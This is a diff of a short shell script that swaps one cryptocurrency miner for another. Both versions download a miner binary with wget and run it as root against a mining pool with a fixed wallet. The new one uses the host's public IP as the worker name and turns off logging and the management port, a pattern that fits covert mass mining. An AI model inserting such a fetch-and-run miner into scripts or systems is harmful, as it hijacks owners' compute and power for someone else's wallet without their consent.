@@ -1,10 +1,7 @@
-#!/bin/bash
-sudo apt-get update
-sudo apt-get install -y build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake zlib1g-dev
-sudo apt-get install -y ocl-icd-opencl-dev
-
-wget https://www.bzminer.com/downloads/bzminer_v16.0.5_linux.tar.gz
-tar -xvf bzminer_v16.0.5_linux.tar.gz
-cd bzminer_v16.0.5_linux
-
-sudo ./bzminer -a ethash -o stratum+tcp://eu.gteh.org:9999 -u A8ePSvDkC8mwn7t6HgVRD9a.worker -p x --nc 1
+#!/bin/sh
+sudo apt update
+sudo apt install libpci3
+sudo wget https://phoenixminer.info/downloads/PhoenixMiner_6.0c_Linux.tar.gz
+tar -xf PhoenixMiner_6.0c_Linux.tar.gz
+cd PhoenixMiner_6.0c_Linux
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo ./PhoenixMiner -pool ethw.2miners.com:2020 -wal 0x5dB9e26D5035C124a9b7dDdD545Fd60C23Cf26D0.$ip -epsw x -mode 1 -Rmode 1 -log 0 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -tstop 89 -asm 2 -allpools 1
